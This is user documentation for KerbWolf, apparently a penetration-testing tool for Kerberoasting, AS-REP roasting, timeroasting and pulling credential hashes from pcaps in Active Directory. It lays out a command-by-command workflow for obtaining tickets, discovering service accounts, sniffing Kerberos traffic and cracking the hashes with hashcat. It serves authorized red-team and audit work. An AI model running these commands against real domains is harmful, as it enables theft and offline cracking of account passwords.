# KerbWolf Guide

## What is Kerberos roasting?

When a user or service authenticates in Active Directory, the KDC hands out encrypted tickets. These tickets are encrypted with a key derived from the account's password. Get your hands on one of those encrypted blobs and you can try to crack the encryption offline by guessing passwords until one produces a key that decrypts correctly. That is roasting.

KerbWolf covers 4 attack types and 5 encryption types, producing 19 hash formats compatible with hashcat and John the Ripper. In addition to Kerberos, it extracts NTLM and MS-SNTP (timeroast) hashes from pcap captures.

The Kerberos authentication flow that we are targeting:

```mermaid
sequenceDiagram
    participant Client
    participant KDC as KDC (Domain Controller)
    participant Service

    rect rgb(40, 40, 60)
    Note over Client,KDC: Step 1 — Get a TGT
    Client->>KDC: AS-REQ (I am admin, here's my encrypted timestamp)
    KDC-->>Client: AS-REP (here's your TGT, encrypted with your key)
    end

    rect rgb(40, 60, 40)
    Note over Client,Service: Step 2 — Get a service ticket
    Client->>KDC: TGS-REQ (I want access to MSSQLSvc/db01, here's my TGT)
    KDC-->>Client: TGS-REP (here's a service ticket, encrypted with the service's key)
    end

    rect rgb(60, 40, 40)
    Note over Client,Service: Step 3 — Access the service
    Client->>Service: AP-REQ (here's my service ticket)
    Service-->>Client: AP-REP (access granted)
    end
```



The three encrypted blobs in this flow (AS-REQ timestamp, AS-REP response, TGS-REP service ticket) can all be extracted and cracked offline.

## Attacks

Three attacks, three different Kerberos messages. Full protocol details and diagrams are on the [Attacks in Depth](attacks.md) page.

### TGS-REP Roast (Kerberoast)

Request a service ticket for any SPN account; the KDC encrypts it with the service's key. Crack it to get the service account's password. Service accounts often have weak passwords and high privileges.

**Tool:** `kw-roast` &nbsp;|&nbsp; **Auth required:** Yes (password, hash, or ccache) &nbsp;|&nbsp; **Exception:** `--no-preauth` needs no auth

### AS-REP Roast

Accounts with `DONT_REQUIRE_PREAUTH` skip pre-authentication. Send an AS-REQ and the KDC gives you an encrypted blob for free (no credentials needed).

**Tool:** `kw-asrep` &nbsp;|&nbsp; **Auth required:** No (LDAP discovery needs auth)

### AS-REQ Pre-Auth

When users authenticate, their AS-REQ contains an encrypted timestamp. Capture it from the network and crack it offline. Completely passive.

**Tool:** `kw-extract` &nbsp;|&nbsp; **Auth required:** No (offline pcap parsing)

`kw-extract` also extracts NTLM hashes (SMB, HTTP, WinRM, LDAP, DCE-RPC, SMTP, POP3, IMAP, Telnet), MS-SNTP timeroast hashes, and plaintext credentials from LDAP simple binds — all from the same pcap in one pass.

### Timeroasting (MS-SNTP)

Domain controllers respond to authenticated NTP requests from computer, gMSA, and trust accounts. The response contains a hash of the account's NT password. No authentication is needed to request these hashes -- just a valid RID. Targets machine accounts, which often have weak or default passwords.

**Tool:** `kw-timeroast` &nbsp;|&nbsp; **Auth required:** No &nbsp;|&nbsp; **Two formats:** 68-byte MD5 (hashcat 31300) + 120-byte KDF+HMAC-SHA512

!!! tip "Who owns the key?"
    AS-REQ and AS-REP target the **client's** key (user's password). TGS-REP targets the **service's** key (service account's password). Timeroasting targets **computer/trust account** NT hashes.

## Attack matrix

|  | DES-CBC-CRC (1) | DES-CBC-MD5 (3) | AES128 (17) | AES256 (18) | RC4 (23) |
|---|---|---|---|---|---|
| **AS-REQ** | `$krb5pa$1$` | `$krb5pa$3$` | `$krb5pa$17$` (19800) | `$krb5pa$18$` (19900) | `$krb5pa$23$` (7500) |
| **AS-REP** | `$krb5asrep$1$` | `$krb5asrep$3$` | `$krb5asrep$17$` (32100) | `$krb5asrep$18$` (32200) | `$krb5asrep$23$` (18200) |
| **TGS-REP** | `$krb5tgs$1$` | `$krb5tgs$3$` | `$krb5tgs$17$` (19600) | `$krb5tgs$18$` (19700) | `$krb5tgs$23$` (13100) |

Numbers in parentheses are hashcat mode numbers. The 9 RC4/AES modes work in hashcat and John today. The 6 DES modes are proposed hashcat modules that would brute-force the 56-bit key directly.

### Timeroasting matrix

| # | Format | Algorithm | Hash format | Hashcat mode |
|---|--------|-----------|-------------|-------------|
| 1 | 68-byte Authenticator | `MD5(NTOWFv1 \|\| salt)` | `$sntp-ms$<RID>$<hash>$<salt>` | 31300 |
| 2 | 120-byte ExtendedAuthenticator | KDF(SP800-108, HMAC-SHA512) + HMAC-SHA512 | `$sntp-ms-sha512$<RID>$<hash>$<salt>` | proposed |

---

## Getting started

### Install

```bash
pip install .
# or
uv tool install .
```

You'll need Python 3.11+ and system Kerberos libraries (`libkrb5-dev` on Debian, `krb5-devel` on RHEL). See the [installation guide](../getting-started/installation.md) for details.

### Typical workflow

```mermaid
flowchart LR
    A["Get credentials<br/>(password, hash, key)"] --> B["kw-tgt<br/>Request TGT"]
    B --> C["admin.ccache"]
    C --> D["kw-roast --ldap<br/>Kerberoast"]
    C --> E["kw-asrep --ldap<br/>AS-REP Roast"]
    D & E --> F["hashes.txt"]
    F --> G["hashcat / john<br/>Crack offline"]
    G --> H["Passwords!"]

    Z["Packet capture<br/>(tcpdump, Wireshark)"] --> Y["kw-extract<br/>Parse pcap"]
    Y --> F

    style C fill:#2a2a4a,stroke:#8b8bff
    style F fill:#4a2020,stroke:#ff6b6b
    style H fill:#1a3a1a,stroke:#6bcb77
```



**1. Get a TGT** (if you have credentials):

```bash
kw-tgt -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p 'Password1!' -o admin.ccache
```

**2. Kerberoast via LDAP** (auto-discover service accounts):

```bash
kw-roast -k -c admin.ccache --ldap -o hashes.txt
```

Domain and username come from the ccache, so `-d` and `-u` aren't needed. DC is found via DNS SRV. No DNS? Add `--dc-ip`.

**3. Crack with hashcat:**

```bash
hashcat -m 13100 hashes.txt wordlist.txt    # RC4
hashcat -m 19700 hashes.txt wordlist.txt    # AES256
```

### No-auth alternatives

**AS-REP Roast**:

```bash
kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -t jsmith -t svc_backup
```

**AS-REQ Pre-Auth**:

```bash
kw-extract capture.pcap -o hashes.txt
tcpdump -i eth0 -w - port 88 | kw-extract -
```

### DC resolution

Without `--dc-ip`, KerbWolf tries to find the DC on its own:

```mermaid
flowchart TD
    A["Start: need DC IP + hostname"] --> B{"-k -c ccache?"}
    B -->|Yes| C["Extract domain + user<br/>from ccache principal"]
    B -->|No| D["Use -d domain and -u user"]

    C & D --> E{"DNS SRV lookup<br/>_kerberos._tcp.DOMAIN"}
    E -->|Found| F["DC hostname + IP from SRV"]
    E -->|Failed| G{"--dc-ip provided?"}

    G -->|Hostname| I["Resolve hostname → IP<br/>hostname = --dc-ip"]
    G -->|Not provided| J{"Resolve domain A/AAAA"}
    G -->|IP address| H{"--dc-hostname<br/>provided?"}

    H -->|Yes| H2["IP = --dc-ip<br/>hostname = --dc-hostname"]
    H -->|No| H3["IP = --dc-ip<br/>hostname = ⚠ missing"]

    J -->|Found| K["Use domain IP<br/>hostname = ⚠ missing"]
    J -->|Failed| L["Error: use --dc-ip"]

    F --> M["DC IP + hostname ready"]
    I --> M
    H2 --> M
    H3 --> N["DC IP only<br/>Kerberos LDAP will need<br/>RootDSE lookup for hostname"]
    K --> N

    style F fill:#1a3a1a,stroke:#6bcb77
    style M fill:#1a3a1a,stroke:#6bcb77
    style N fill:#4a4a20,stroke:#ffd93d
    style L fill:#4a2020,stroke:#ff6b6b
    style H3 fill:#4a4a20,stroke:#ffd93d
```



!!! warning "Kerberos LDAP needs a hostname"
    GSSAPI authentication constructs an SPN like `ldap/DC01.corp.local`. If KerbWolf only has a DC IP (no hostname from SRV or `--dc-hostname`), it will attempt an anonymous RootDSE lookup to discover the DC's `dnsHostName`. If that fails, use `--dc-hostname` explicitly.

### Kerberos LDAP setup

When using `-k` for LDAP authentication, you need a working Kerberos environment. The easiest way:

```bash
# Point DNS at the DC (SRV records resolve automatically)
echo "nameserver 10.0.0.1" > /etc/resolv.conf
```

Or generate config files:

```bash
nxc smb 10.0.0.1 --generate-krb5-file /etc/krb5.conf
nxc smb 10.0.0.1 --generate-hosts-file /etc/hosts
```

---

## Deep dives

- [Attacks in Depth](attacks.md) - protocol details, sequence diagrams, ASN.1 paths
- [Encryption Types](encryption-types.md) - key derivation, salt, Windows version history
- [Hash Formats](hash-formats.md) - cipher splitting, hashcat/John format tables, cracking

## Disclaimer

KerbWolf is intended for authorized penetration testing, red team engagements, and security audits only. You must have explicit written permission from the system owner before attacking any Active Directory environment.
